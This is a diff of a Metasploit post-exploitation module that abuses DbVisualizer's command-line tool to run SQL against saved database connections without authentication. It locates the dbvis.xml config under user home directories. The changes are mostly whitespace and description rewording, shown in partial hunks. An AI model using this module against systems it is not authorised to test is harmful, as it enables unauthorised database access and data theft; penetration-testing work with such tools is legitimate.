@@ -13,12 +13,15 @@ class Metasploit3 < Msf::Post
 
   def initialize(info={})
     super( update_info( info,
-        'Name'          => 'Multi Manage Dbvis Query',
+        'Name'          => 'Multi Manage DbVisualizer Query',
         'Description'   => %q{
-           Dbvisulaizer offers a command line functionality to execute SQL pre-configured databases (With GUI).
-           The remote database can be accessed from the command line without the need to authenticate.
-           Attention, backslash quotes and your (stacked or not) queries should end with ;
-           The module abuses this functionality to query the remote database and store the result.
+          Dbvisulaizer offers a command line functionality to execute SQL pre-configured databases
+          (With GUI). The remote database can be accessed from the command line without the need
+          to authenticate, and this module abuses this functionality to query and will store the
+          results.
+
+          Please note: backslash quotes and your (stacked or not) queries should
+          end with a semicolon.
         },
         'License'       => MSF_LICENSE,
         'Author'        => [ 'David Bloom' ], # Twitter: @philophobia78
@@ -56,7 +59,7 @@ class Metasploit3 < Msf::Post
       if (user =~ /root/)
         user_base = "/root/"
       else
-         user_base="/home/#{user}/"
+         user_base = "/home/#{user}/"
       end
       dbvis_file = "#{user_base}.dbvis/config70/dbvis.xml"
     when /win/
@@ -78,7 +81,7 @@ class Metasploit3 < Msf::Post
         print_error("File not found: #{dbvis_file}")
         return
       end
-      old_version= true
+      old_version = true
     end
 
     print_status("Reading : #{dbvis_file}" )
@@ -91,10 +94,10 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    db_found=false
-    alias_found=false
-    db_type=nil
-    db_type_ok=false
+    db_found = false
+    alias_found = false
+    db_type = nil
+    db_type_ok = false
 
     # fetch config file
     raw_xml.each_line do |line|
@@ -102,7 +105,7 @@ class Metasploit3 < Msf::Post
       if line =~ /<Database id=/
         db_found = true
       elsif line =~ /<\/Database>/
-        db_found=false
+        db_found = false
       end
 
       if db_found == true
@@ -141,7 +144,7 @@ class Metasploit3 < Msf::Post
     case session.platform
     when /linux/
       dbvis = session.shell_command("locate dbviscmd.sh").chomp
-      if dbvis.chomp==""
+      if dbvis.chomp == ""
         print_error("dbviscmd.sh not found")
         return nil
       else
@@ -164,7 +167,7 @@ class Metasploit3 < Msf::Post
       #Browse program content to find a possible dbvis home
       dirs.each do |d|
          if (d =~ /DbVisualizer[\S+\s+]+/i)
-           dbvis_home_dir=d
+           dbvis_home_dir = d
          end
       end
       if  dbvis_home_dir.blank?
@@ -183,14 +186,14 @@ class Metasploit3 < Msf::Post
 
   # Query execution method
   def dbvis_query(dbvis,sql)
-    error =false
-    resp=''
-    if file?(dbvis)==true
+    error = false
+    resp = ''
+    if file?(dbvis) == true
       f = session.fs.file.stat(dbvis)
       if f.uid == Process.euid or Process.groups.include?f.gid
         print_status("Trying to execute evil sql, it can take time ...")
         args = "-connection #{datastore['DBALIAS']} -sql \"#{sql}\""
-        dbvis ="\"#{dbvis}\""
+        dbvis = "\"#{dbvis}\""
         cmd = "#{dbvis} #{args}"
         resp = cmd_exec(cmd)
         print_line("")
